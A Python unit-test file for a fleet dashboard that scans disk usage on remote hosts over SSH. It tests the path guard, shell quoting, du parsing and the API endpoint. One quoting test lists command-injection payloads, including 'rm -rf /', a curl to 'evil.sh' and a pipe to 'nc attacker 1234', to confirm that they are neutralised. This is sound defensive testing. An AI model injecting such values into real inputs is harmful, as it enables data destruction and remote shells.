"""Disk-content scanning on any host in the fleet.

The tab used to refuse anything but the hub, because the scanner shelled `du`
against the local root mount. A remote is now scanned with the same `du` over
the SSH channel the fleet is already polled on — which means a client-supplied
path reaches a remote login shell, so the path guard and the quoting are load
bearing and tested as such.
"""
import os
import sys
import unittest
from unittest.mock import patch

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import app


_DU = ("4096000\t/srv/data/models\n"
       "1024000\t/srv/data/models/llama\n"
       "512000\t/srv/data/models/qwen\n"
       "2048000\t/srv/data/logs\n"
       "8192000\t/srv/data\n")
_DF = "/dev/sda1 100000000 40000000 55000000 43% /srv"
_OUT = _DU + "---HLM-DF---\n" + _DF

_HOST = {"name": "vader", "ssh_target": "anakin@vader",
         "last_check": {"summary": {"overall": "ok"}, "os": {"family": "linux"}}}


class TestPathGuard(unittest.TestCase):
    """_safe_scan_path is what stands between a query string and a remote shell."""

    def test_accepts_a_plain_absolute_path(self):
        self.assertEqual(app._safe_scan_path("/srv/data"), "/srv/data")
        self.assertEqual(app._safe_scan_path("/srv/data/"), "/srv/data")
        self.assertEqual(app._safe_scan_path("/"), "/")

    def test_rejects_relative_paths_and_escapes(self):
        for bad in ("../etc", "srv/data", "", None, "./x"):
            self.assertIsNone(app._safe_scan_path(bad), bad)

    def test_interior_dotdot_normalises_rather_than_escaping(self):
        """"/srv/../etc" is just "/etc" — still absolute, still inside the tree the
        hub is allowed to read, and the same answer the local scanner has always
        given. What must never survive is a '..' that is still there afterwards,
        because that is the one that walks out of the root."""
        self.assertEqual(app._safe_scan_path("/srv/../etc"), "/etc")
        self.assertEqual(app._safe_scan_path("/../.."), "/")
        self.assertNotIn("..", (app._safe_scan_path("/a/b/../../c") or "").split("/"))

    def test_rejects_control_bytes(self):
        for bad in ("/srv/\x00etc", "/srv/a\nb", "/srv/a\rb"):
            self.assertIsNone(app._safe_scan_path(bad), repr(bad))

    def test_shell_metacharacters_are_quoted_not_executed(self):
        """The command string is handed to a remote login shell, so the guard
        alone isn't enough — the path is shell-quoted, and the proof is that a
        shell parser sees each nasty path as exactly one argument."""
        import shlex
        for nasty in ("/srv/$(touch /tmp/pwned)",
                      "/srv/a; rm -rf /",
                      "/srv/`id`",
                      "/srv/a && curl evil.sh",
                      "/srv/a|nc attacker 1234",
                      "/srv/it's"):
            cmd = app._remote_scan_cmd(nasty)
            toks = shlex.split(cmd)
            self.assertIn(nasty, toks, f"{nasty!r} did not survive as one token")
            for danger in ("rm", "curl", "nc", "touch", "id"):
                self.assertNotIn(danger, toks, f"{nasty!r} leaked a {danger} token")

    def test_path_is_passed_after_a_double_dash(self):
        """A path beginning with '-' must not be read as a du flag."""
        self.assertIn("-- ", app._remote_scan_cmd("/srv/data"))


class TestDuParsing(unittest.TestCase):
    def test_builds_a_nested_tree(self):
        total, entries = app._parse_du(_DU, "/srv/data")
        self.assertEqual(total, 8192000)
        by = {e["name"]: e for e in entries}
        self.assertEqual(by["models"]["bytes"], 4096000)
        kids = {c["name"]: c["bytes"] for c in by["models"]["children"]}
        self.assertEqual(kids["llama"], 1024000)
        self.assertEqual(kids["qwen"], 512000)

    def test_entries_are_largest_first(self):
        _t, entries = app._parse_du(_DU, "/srv/data")
        self.assertEqual([e["name"] for e in entries], ["models", "logs"])

    def test_ignores_malformed_lines(self):
        total, entries = app._parse_du("garbage\nnot\tanumber\n99\t/x/y\n5\t/x\n", "/x")
        self.assertEqual(total, 5)
        self.assertEqual([e["name"] for e in entries], ["y"])

    def test_local_and_remote_share_one_parser(self):
        """The two scanners must not drift into rendering the same filesystem
        differently — the local worker parses through this same function."""
        import inspect
        self.assertIn("_parse_du", inspect.getsource(app._disk_scan_worker))
        self.assertIn("_parse_du", inspect.getsource(app._disk_scan_worker_remote))


class TestFreeSpace(unittest.TestCase):
    def test_reads_available_from_df(self):
        self.assertEqual(app._parse_remote_free(_DF), 55000000)

    def test_missing_df_is_absent_not_zero(self):
        self.assertIsNone(app._parse_remote_free(""))
        self.assertIsNone(app._parse_remote_free("df: /nope: No such file"))


class TestRemoteWorker(unittest.TestCase):
    def setUp(self):
        app._DISK_SCAN.clear()

    def test_happy_path_stores_a_done_scan(self):
        key = app._disk_scan_key("vader", "/srv/data")
        with patch("app.list_hosts", return_value=[_HOST]), \
             patch("app._ssh", return_value=(0, _OUT, "", 120)) as ssh:
            app._disk_scan_worker_remote(key, "vader", "/srv/data")
        ent = app._DISK_SCAN[key]
        self.assertEqual(ent["state"], "done")
        self.assertEqual(ent["total"], 8192000)
        self.assertEqual(ent["free"], 55000000)
        # One round trip for both answers.
        self.assertEqual(ssh.call_count, 1)
        self.assertEqual(ssh.call_args[0][:3], ("anakin", "vader", 22))

    def test_partial_output_with_nonzero_exit_is_still_shown(self):
        """du exits non-zero on any unreadable subdirectory. A scan of / on a box
        with one root-only folder would otherwise report failure instead of the
        ninety-nine folders it did read."""
        key = app._disk_scan_key("vader", "/srv/data")
        with patch("app.list_hosts", return_value=[_HOST]), \
             patch("app._ssh", return_value=(1, _OUT, "du: cannot read /srv/data/secret", 120)):
            app._disk_scan_worker_remote(key, "vader", "/srv/data")
        self.assertEqual(app._DISK_SCAN[key]["state"], "done")

    def test_empty_output_is_an_error_not_an_empty_treemap(self):
        key = app._disk_scan_key("vader", "/srv/data")
        with patch("app.list_hosts", return_value=[_HOST]), \
             patch("app._ssh", return_value=(1, "", "permission denied", 90)):
            app._disk_scan_worker_remote(key, "vader", "/srv/data")
        ent = app._DISK_SCAN[key]
        self.assertEqual(ent["state"], "error")
        self.assertIn("permission denied", ent["error"])

    def test_unknown_host(self):
        key = app._disk_scan_key("ghost", "/srv")
        with patch("app.list_hosts", return_value=[]):
            app._disk_scan_worker_remote(key, "ghost", "/srv")
        self.assertEqual(app._DISK_SCAN[key]["state"], "error")
        self.assertIn("unknown host", app._DISK_SCAN[key]["error"])

    def test_uses_a_long_timeout(self):
        """The default _ssh timeout is 8s — a real du takes minutes."""
        key = app._disk_scan_key("vader", "/srv")
        with patch("app.list_hosts", return_value=[_HOST]), \
             patch("app._ssh", return_value=(0, _OUT, "", 1)) as ssh:
            app._disk_scan_worker_remote(key, "vader", "/srv")
        self.assertEqual(ssh.call_args[1]["timeout"], app._DISK_SCAN_TIMEOUT)


class TestCacheKeying(unittest.TestCase):
    def test_same_path_on_two_hosts_is_two_scans(self):
        """Keyed by path alone, a scan of /var on one machine was served as a scan
        of /var on the next one clicked."""
        self.assertNotEqual(app._disk_scan_key("vader", "/var"),
                            app._disk_scan_key("cloudy", "/var"))
        self.assertEqual(app._disk_scan_key(None, "/var"),
                         app._disk_scan_key("local", "/var"))


class TestEndpoint(unittest.TestCase):
    def setUp(self):
        self.c = app.app.test_client()
        app._DISK_SCAN.clear()

    def test_remote_scan_is_dispatched_over_ssh(self):
        with patch("app.list_hosts", return_value=[_HOST]), \
             patch("app._disk_scan_worker_remote") as w:
            r = self.c.get("/api/disk_scan?path=/srv/data&host=vader")
        j = r.get_json()
        self.assertEqual(j["state"], "scanning")
        self.assertEqual(j["host"], "vader")
        # Given a moment the thread runs; assert it was aimed at the remote worker.
        for _ in range(50):
            if w.called:
                break
            import time as _t; _t.sleep(0.01)
        self.assertTrue(w.called)
        self.assertEqual(w.call_args[0][1:], ("vader", "/srv/data"))

    def test_windows_host_says_why_instead_of_failing_later(self):
        win = dict(_HOST, name="deskbox",
                   last_check={"summary": {"overall": "ok"}, "os": {"family": "windows"}})
        with patch("app.list_hosts", return_value=[win]):
            j = self.c.get("/api/disk_scan?path=/c&host=deskbox").get_json()
        self.assertEqual(j["state"], "error")
        self.assertIn("Windows", j["error"])

    def test_unknown_host_is_rejected_before_any_ssh(self):
        with patch("app.list_hosts", return_value=[]), \
             patch("app._ssh") as ssh:
            j = self.c.get("/api/disk_scan?path=/srv&host=nope").get_json()
        self.assertEqual(j["state"], "error")
        ssh.assert_not_called()

    def test_bad_path_is_rejected(self):
        with patch("app._ssh") as ssh:
            j = self.c.get("/api/disk_scan?path=../../etc&host=vader").get_json()
        self.assertEqual(j["state"], "error")
        ssh.assert_not_called()

    def test_local_still_works_and_is_the_default(self):
        with patch("app._safe_host_dir", return_value="/tmp"), \
             patch("app._disk_scan_worker") as w:
            j = self.c.get("/api/disk_scan?path=/tmp").get_json()
        self.assertEqual(j["state"], "scanning")
        self.assertEqual(j["host"], "local")

    def test_a_cached_remote_scan_is_served_per_host(self):
        done = {"state": "done", "at": 9e9, "total": 7, "entries": [], "free": 1, "error": None}
        with patch("app.list_hosts", return_value=[_HOST]), \
             patch.dict(app._DISK_SCAN, {app._disk_scan_key("vader", "/srv"): done}):
            j = self.c.get("/api/disk_scan?path=/srv&host=vader").get_json()
        self.assertEqual(j["state"], "done")
        self.assertEqual(j["total"], 7)

    def test_rescan_of_an_in_flight_scan_does_not_start_a_second_one(self):
        """rescan=1 must not be a way around the one-scan-at-a-time rule."""
        scanning = {"state": "scanning", "at": int(__import__("time").time())}
        with patch("app._safe_host_dir", return_value="/tmp"), \
             patch.dict(app._DISK_SCAN, {app._disk_scan_key("local", "/tmp"): scanning}), \
             patch("app._disk_scan_worker") as w:
            j = self.c.get("/api/disk_scan?path=/tmp&rescan=1").get_json()
        self.assertEqual(j["state"], "scanning")
        w.assert_not_called()

    def test_rescan_within_cooldown_of_a_finished_scan_reuses_the_result(self):
        """rescan=1 right after a scan just finished must not fire a second one —
        that's the exact resource-exhaustion gap this test guards."""
        done = {"state": "done", "at": int(__import__("time").time()), "total": 7,
                "entries": [], "free": 1, "error": None}
        with patch("app._safe_host_dir", return_value="/tmp"), \
             patch.dict(app._DISK_SCAN, {app._disk_scan_key("local", "/tmp"): done}), \
             patch("app._disk_scan_worker") as w:
            j = self.c.get("/api/disk_scan?path=/tmp&rescan=1").get_json()
        self.assertEqual(j["state"], "done")
        self.assertEqual(j["total"], 7)
        w.assert_not_called()

    def test_rescan_past_cooldown_starts_a_fresh_scan(self):
        """Non-regression: rescan=1 must still work once the cooldown has passed."""
        stale = {"state": "done", "at": 0, "total": 7, "entries": [], "free": 1, "error": None}
        with patch("app._safe_host_dir", return_value="/tmp"), \
             patch.dict(app._DISK_SCAN, {app._disk_scan_key("local", "/tmp"): stale}), \
             patch("app._disk_scan_worker") as w:
            j = self.c.get("/api/disk_scan?path=/tmp&rescan=1").get_json()
        self.assertEqual(j["state"], "scanning")
        for _ in range(50):
            if w.called:
                break
            import time as _t; _t.sleep(0.01)
        self.assertTrue(w.called)


if __name__ == "__main__":
    unittest.main()
